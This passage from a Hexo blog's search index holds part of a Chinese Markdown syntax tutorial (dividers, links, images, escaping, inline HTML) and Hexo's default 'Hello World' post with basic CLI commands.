markdown分割线语法</h2><p>要创建分割线，需在单独一行上使用三个或多个星号、破折号或下划线，且不能包含其他内容。<br><br>***<br><br>-—<br><br>___</p><hr><hr><hr><p>为了兼容性，在分隔线前后均添加空白行。</p><h2 id="8-markdown链接语法"><a href="#8-markdown链接语法" class="headerlink" title="8. markdown链接语法"></a>8. markdown链接语法</h2><p>链接文本放在中括号内，链接地址放在后面的括号中，链接title可选。<br>超链接markdown语法代码：<br></p><pre><code class="hljs">[超链接显示名](超链接地址 &quot;超链接title&quot;)  </code></pre><p>例： </p><pre><code class="hljs">这是一个链接 [Markdown语法](https://markdown.com.cn)。</code></pre><p>这是一个链接 <a href="https://markdown.com.cn/">Markdown语法</a></p><h3 id="给链接增加title"><a href="#给链接增加title" class="headerlink" title="给链接增加title"></a>给链接增加title</h3><p>链接title是当鼠标悬停在链接上时会出现的文字，这个title是可选的，他放在圆括号中链接地址后面，跟链接地址之间以空格分隔。<br><br>例： </p><pre><code class="hljs">这是一个链接 [Markdown语法](https://markdown.com.cn &quot;最好的markdown教程&quot;)。</code></pre><p>这是一个链接 <a href="https://markdown.com.cn/" title="最好的markdown教程">Markdown语法</a>。</p><h3 id="网址和Email地址"><a href="#网址和Email地址" class="headerlink" title="网址和Email地址"></a>网址和Email地址</h3><p>使用尖括号可以很方便地把URL或者Email地址变成可点击的链接。<br>例：  </p><pre><code class="hljs">&lt;https://markdown.com.cn&gt;  &lt;fake@example.com&gt;</code></pre><p><a href="https://markdown.com.cn/">https://markdown.com.cn</a><br><a href="mailto:&#102;&#x61;&#107;&#x65;&#64;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#102;&#x61;&#107;&#x65;&#64;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;</a></p><h3 id="带格式化的链接"><a href="#带格式化的链接" class="headerlink" title="带格式化的链接"></a>带格式化的链接</h3><p>强调链接，在链接语法前后增加星号。要将链接表示为代码，要在方括号内添加反引号。</p><pre><code class="hljs">I love supporting the **[EFF](https://eff.org)**.&lt;br&gt;This is the *[Markdown Guide](https://www.markdownguide.org)*.&lt;br&gt;See the section on [`code`](#code).</code></pre><p>I love supporting the <strong><a href="https://eff.org/">EFF</a></strong>.<br><br>This is the <em><a href="https://www.markdownguide.org/">Markdown Guide</a></em>.<br><br>See the section on <a href="#code"><code>code</code></a>.</p><h3 id="引用类型链接"><a href="#引用类型链接" class="headerlink" title="引用类型链接"></a>引用类型链接</h3><p>引用样式链接是一种特殊的链接，它使URL在Markdown中更易于显示和阅读。参考样式链接分为两部分：与文本保持内联的部分以及存储在文件中其他位置的部分，以使文本易于阅读。</p><h4 id="链接的第一部分格式"><a href="#链接的第一部分格式" class="headerlink" title="链接的第一部分格式"></a>链接的第一部分格式</h4><p>引用类型的链接的第一部分使用两组括号进行格式设置。第一组方括号包围应显示为链接的文本。第二组括号显示了一个标签，该标签用于指向您存储在文档其他位置的链接。</p><p>尽管不是必需的，可以在第一组和第二组括号之间包含一个空格。第二组括号中的标签不区分大小写，可以包含字母，数字，空格或标点符号。</p><p>例：<br><br>[hobbit-hole][1]<br>[hobbit-hole] [1]</p><h4 id="链接的第二部分格式"><a href="#链接的第二部分格式" class="headerlink" title="链接的第二部分格式"></a>链接的第二部分格式</h4><p>引用类型链接的第二部分使用以下属性设置格式：</p><ol><li>放在括号中的标签，其后紧跟一个冒号和至少一个空格（例如[label]:）。</li><li>链接的URL，可以选择将其括在尖括号中。</li><li>链接的可选标题，可以将其括在双引号，单引号或括号中。<br>例：<br>[1]: <a href="https://en.wikipedia.org/wiki/Hobbit#Lifestyle">https://en.wikipedia.org/wiki/Hobbit#Lifestyle</a></li></ol><p>可以将链接的第二部分放在Markdown文档中的任何位置。有些人将它们放在出现的段落之后，有些人则将它们放在文档的末尾（例如尾注或脚注）。</p><pre><code class="hljs">注意：不同的 Markdown 应用程序处理URL中间的空格方式不一样。为了兼容性，请尽量使用%20代替空格。</code></pre><h2 id="9-markdown图片语法"><a href="#9-markdown图片语法" class="headerlink" title="9. markdown图片语法"></a>9. markdown图片语法</h2><p>要添加图像，请使用感叹号 (!), 然后在方括号增加替代文本，图片链接放在圆括号里，括号里的链接后可以增加一个可选的图片标题文本。</p><p>插入图片Markdown语法代码：</p><pre><code class="hljs">![图片alt](图片链接 &quot;图片title&quot;)。  </code></pre><p>例：  </p><pre><code class="hljs">![这是图片](/philly-magic-garden.jpg &quot;Magic Gardens&quot;)</code></pre><p><img src="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/philly-magic-garden.jpg" alt="这是图片" title="Magic Gardens"></p><h3 id="链接图片"><a href="#链接图片" class="headerlink" title="链接图片"></a>链接图片</h3><pre><code class="hljs">[![沙漠中的岩石图片](/shiprock.jpg &quot;Shiprock&quot;)](https://markdown.com.cn)</code></pre><p><a href="https://markdown.com.cn/"><img src="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/shiprock.jpg" alt="沙漠中的岩石图片" title="Shiprock"></a></p><h2 id="10-markdown转义字符语法"><a href="#10-markdown转义字符语法" class="headerlink" title="10. markdown转义字符语法"></a>10. markdown转义字符语法</h2><p>要显示原本用于格式化 Markdown 文档的字符，请在字符前面添加反斜杠字符 \ 。<br>如：  </p><pre><code class="hljs">\* Without the backslash, this would be a bullet in an unordered list.</code></pre><p>* Without the backslash, this would be a bullet in an unordered list.</p><h3 id="可做转义的字符"><a href="#可做转义的字符" class="headerlink" title="可做转义的字符"></a>可做转义的字符</h3><p>‘\‘, ‘ 、’, ‘*’, ‘_’, ‘{}’, ‘[]’, ‘()’, ‘#’, ‘+’, ‘-‘, ‘.’, ‘!’, ‘|’等都可通过反斜杠字符从而达到转义目的。</p><h3 id="特殊字符自动转义"><a href="#特殊字符自动转义" class="headerlink" title="特殊字符自动转义"></a>特殊字符自动转义</h3><p>在 HTML 文件中，有两个字符需要特殊处理： &lt; 和 &amp; 。 &lt; 符号用于起始标签，&amp; 符号则用于标记 HTML 实体，如果你只是想要使用这些符号，你必须要使用实体的形式，像是 &lt; 和 &amp;。</p><p>&amp; 符号其实很容易让写作网页文件的人感到困扰，如果你要打「AT&amp;T」 ，你必须要写成「AT&amp;amp;T」 ，还得转换网址内的 &amp; 符号，如果你要链接到：<a href="http://images.google.com/imagesnum=30&q=larry+bird">http://images.google.com/imagesnum=30&amp;q=larry+bird</a><br>必须将网站转成 <a href="http://images.google.com/imagesnum=30/&amp;q=larry+bird">http://images.google.com/imagesnum=30\&amp;q=larry+bird</a> 才能放到链接标签的 href 属性里。不用说也知道这很容易忘记，这也可能是 HTML 标准检查所检查到的错误中，数量最多的。<br>Markdown 允许你直接使用这些符号，它帮你自动转义字符。如果你使用 &amp; 符号的作为 HTML 实体的一部分，那么它不会被转换，而在其它情况下，它则会被转换成 &amp;amp;。所以你如果要在文件中插入一个著作权的符号，你可以这样写：&amp;copy;Markdown 将不会对这段文字做修改，但是如果你这样写：AT&amp;T;Markdown 就会将它转为：AT&amp;amp;T.类似的状况也会发生在 &lt; 符号上，因为 Markdown 支持 行内 HTML ，如果你使用 &lt; 符号作为 HTML 标签的分隔符，那 Markdown 也不会对它做任何转换，但是如果你是写：4&lt;5 Markdown 将会把它转换为：4 &amp;lt; 5.</p><h2 id="11-markdown内嵌HTML标签"><a href="#11-markdown内嵌HTML标签" class="headerlink" title="11. markdown内嵌HTML标签"></a>11. markdown内嵌HTML标签</h2><p>对于 Markdown 涵盖范围之外的标签，都可以直接在文件里面用 HTML 本身。如需使用 HTML，不需要额外标注这是 HTML 或是 Markdown，只需 HTML 标签添加到 Markdown 文本中即可。</p><h3 id="行级内联标签"><a href="#行级内联标签" class="headerlink" title="行级内联标签"></a>行级内联标签</h3><p>HTML 的行级內联标签如 &lt;span&gt;、&lt;cite&gt;、&lt;del&gt; 不受限制，可以在 Markdown 的段落、列表或是标题里任意使用。依照个人习惯，甚至可以不用 Markdown 格式，而采用 HTML 标签来格式化。例如：如果比较喜欢 HTML 的 &lt;a&gt; 或 &lt;img&gt; 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图片语法。当你需要更改元素的属性时（例如为文本指定颜色或更改图像的宽度），使用 HTML 标签更方便些。</p><p>HTML 行级內联标签和区块标签不同，在內联标签的范围内， Markdown 的语法是可以解析的。<br>This <strong>word</strong> is bold. This &lt;em&gt;word&lt;&#x2F;em&gt; is italic.<br>渲染效果如下：<br>This <strong>word</strong> is bold. This <em>word</em> is italic.</p><h3 id="区块标签"><a href="#区块标签" class="headerlink" title="区块标签"></a>区块标签</h3><p>区块元素──比如 &lt;div&gt;、&lt;table&gt;、&lt;pre&gt;、&lt;p&gt; 等标签，必须在前后加上空行，以便于内容区分。而且这些元素的开始与结尾标签，不可以用 tab 或是空白来缩进。Markdown 会自动识别这区块元素，避免在区块标签前后加上没有必要的 &lt;p&gt; 标签。</p><p>请注意，Markdown 语法在 HTML 区块标签中将不会被进行处理。例如，你无法在 HTML 区块内使用 Markdown 形式的<em>强调</em>。</p>]]></content>
    
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/03/08/hello-world/"/>
    <url>/2023/03/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
